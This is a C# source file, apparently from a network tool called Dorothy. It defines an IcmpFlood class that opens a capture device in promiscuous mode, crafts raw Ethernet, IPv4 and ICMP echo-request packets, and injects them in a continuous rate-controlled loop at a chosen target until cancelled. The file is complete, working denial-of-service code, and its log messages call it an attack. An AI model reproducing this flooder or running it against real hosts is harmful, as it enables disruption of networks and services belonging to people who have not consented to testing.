using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using PacketProtocolType = PacketDotNet.ProtocolType;

namespace Dorothy.Models
{
    public class IcmpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly long _bytesPerSecond;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public IcmpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, long bytesPerSecond, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = targetMac;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting ICMP Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                // Construct the Ethernet packet
                var ethernetPacket = new EthernetPacket(_sourceMac, new PhysicalAddress(_targetMac), EthernetType.IPv4);
                
                // Construct the IP packet
                var ipPacket = new IPv4Packet(IPAddress.Parse(_sourceIp), IPAddress.Parse(_targetIp))
                {
                    Protocol = ProtocolType.Icmp,
                    TimeToLive = 128
                };

                // Create ICMP Echo Request
                var icmpData = System.Text.Encoding.ASCII.GetBytes("ICMP Flood");
                var icmpPacket = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(icmpData))
                {
                    TypeCode = IcmpV4TypeCode.EchoRequest
                };
                
                // Assign the ICMP packet to the IP packet's payload
                ipPacket.PayloadPacket = icmpPacket;
                
                // Assign the IP packet to the Ethernet packet's payload
                ethernetPacket.PayloadPacket = ipPacket;

                // Calculate packets per second based on bytes per second
                double packetSize = ethernetPacket.Bytes.Length;
                int packetsPerSecond = (int)(_bytesPerSecond / packetSize);
                packetsPerSecond = Math.Max(packetsPerSecond, 1); // Ensure at least 1 packet per second
                double delay = 1000.0 / packetsPerSecond;

                Logger.Info($"ICMP Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");

                while (!_cancellationToken.IsCancellationRequested)
                {
                    try
                    {
                        injectionDevice.SendPacket(ethernetPacket);
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(ex, "Failed to send ICMP packet.");
                    }

                    await Task.Delay(TimeSpan.FromMilliseconds(delay), _cancellationToken)
                        .ContinueWith(t => { }, TaskContinuationOptions.OnlyOnCanceled);
                }
            }
            catch (TaskCanceledException)
            {
                Logger.Info("ICMP Flood attack was canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error during ICMP Flood attack.");
            }
            finally
            {
                _device?.Close();
                Logger.Info("ICMP Flood attack stopped.");
            }
        }

        public void Dispose()
        {
            _device?.Dispose();
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        private static extern int SendARP(int DestIP, int SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
} 